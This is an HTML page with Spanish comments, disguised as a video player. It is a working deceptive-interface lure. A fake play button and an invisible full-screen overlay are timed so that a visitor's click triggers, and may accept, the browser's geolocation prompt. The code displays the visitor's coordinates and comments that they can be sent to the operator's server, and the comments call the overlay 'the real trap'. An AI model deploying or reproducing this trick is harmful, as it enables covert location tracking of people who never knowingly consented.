<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden; /* Evita scroll para que no se mueva nada */
        }

        .container {
            text-align: center;
            position: relative;
            width: 100%;
            max-width: 400px;
        }

        /* El botón falso que ve el usuario */
        .fake-btn {
            background-color: #ff0000;
            color: white;
            padding: 20px 40px;
            font-size: 24px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            z-index: 10; /* Por debajo del overlay pero visible */
            position: relative;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }

        /* La capa invisible que cubre toda la pantalla */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999; /* Muy por encima de todo */
            cursor: pointer;
            /* Fondo ligeramente azul para detectar si tocamos algo fuera del botón */
            /* background-color: rgba(0,0,255,0.1); */ 
        }

        /* Mensaje final */
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- El botón engañoso -->
        <button class="fake-btn" id="triggerBtn">▶ Reproducir Video</button>
        <div id="status"></div>
    </div>

    <!-- La capa invisible que captura el clic -->
    <div id="overlay"></div>

    <script>
        const triggerBtn = document.getElementById('triggerBtn');
        const overlay = document.getElementById('overlay');
        const statusDiv = document.getElementById('status');

        // Función para pedir permiso al navegador
        function askPermission() {
            if (!("geolocation" in navigator)) {
                statusDiv.innerText = "Geolocalización no disponible.";
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    statusDiv.innerHTML = `✅ Ubicación obtenida:<br><b>${lat}, ${lng}</b>`;
                    
                    // Aquí puedes enviar los datos a tu servidor
                    console.log(`Lat: ${lat}, Lng: ${lng}`);
                },
                (error) => {
                    statusDiv.innerText = "Permiso denegado o error.";
                }
            );
        }

        // Evento 1: Clic en el botón falso (simula la acción principal)
        triggerBtn.addEventListener('click', () => {
            statusDiv.innerText = "Cargando video...";
            
            // Lanzamos el aviso del navegador después de un breve retraso
            setTimeout(() => {
                askPermission();
            }, 800); // 800ms es el tiempo ideal para que el cerebro reaccite tarde
        });

        // Evento 2: Clic en cualquier parte de la pantalla (la trampa real)
        overlay.addEventListener('click', () => {
            // Si el usuario hace clic en cualquier lado mientras aparece el aviso,
            // asumimos que intentó dar permiso y lo pedimos inmediatamente.
            askPermission();
        });
    </script>
</body>
</html>
